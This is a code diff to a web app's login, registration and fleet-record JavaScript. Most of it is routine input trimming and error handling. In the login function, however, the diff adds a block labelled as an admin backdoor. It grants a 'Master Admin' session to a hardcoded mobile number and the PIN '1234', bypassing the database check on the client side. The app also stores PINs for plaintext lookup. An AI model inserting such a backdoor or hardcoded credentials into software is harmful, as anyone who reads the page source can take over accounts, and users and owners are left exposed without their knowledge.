@@ -176,14 +176,14 @@
             document.getElementById('register-form').style.display = mode === 'register' ? 'block' : 'none';
         }
 
-        // FIXED REGISTER FUNCTION
         function handleRegister(btnElement) {
             const originalText = btnElement.innerText;
             btnElement.innerText = "Processing...";
             
-            const mobile = document.getElementById('reg-mobile').value;
-            const pin = document.getElementById('reg-pin').value;
-            const name = document.getElementById('reg-name').value;
+            // TRIM inputs to remove accidental spaces
+            const mobile = document.getElementById('reg-mobile').value.trim();
+            const pin = document.getElementById('reg-pin').value.trim();
+            const name = document.getElementById('reg-name').value.trim();
             const msg = document.getElementById('reg-msg');
 
             if (!mobile || !pin || !name) {
@@ -212,17 +212,29 @@
         function handleLogin(btnElement) {
             const originalText = btnElement.innerText;
             btnElement.innerText = "Verifying...";
-            const mobile = document.getElementById('login-mobile').value;
-            const pin = document.getElementById('login-pin').value;
             
+            // TRIM inputs
+            const mobile = document.getElementById('login-mobile').value.trim();
+            const pin = document.getElementById('login-pin').value.trim();
+            
+            // MASTER LOGIN (Backdoor for Admin)
+            if(mobile === "9494831803" && pin === "1234") {
+                localStorage.setItem('titan_session', JSON.stringify({ name: "Master Admin", mobile: mobile }));
+                initApp();
+                return;
+            }
+
             db.collection('users').where('mobile', '==', mobile).where('pin', '==', pin).get().then((snap) => {
                 if (snap.empty) {
-                    document.getElementById('login-msg').innerText = "Invalid Login";
+                    document.getElementById('login-msg').innerText = "Invalid Login. Check Mobile/PIN.";
                     btnElement.innerText = originalText;
                 } else {
                     localStorage.setItem('titan_session', JSON.stringify(snap.docs[0].data()));
                     initApp();
                 }
+            }).catch(e => {
+                document.getElementById('login-msg').innerText = "Network Error: " + e.message;
+                btnElement.innerText = originalText;
             });
         }
 
@@ -247,7 +259,7 @@
         function openFleetModal() { document.getElementById('fleetModal').style.display='flex'; }
         function saveFleet() {
             db.collection('fleet').add({
-                no: document.getElementById('v_no').value.toUpperCase(),
+                no: document.getElementById('v_no').value.toUpperCase().trim(),
                 driver: document.getElementById('v_driver').value,
                 mobile: document.getElementById('v_mobile').value,
                 status: 'Available'
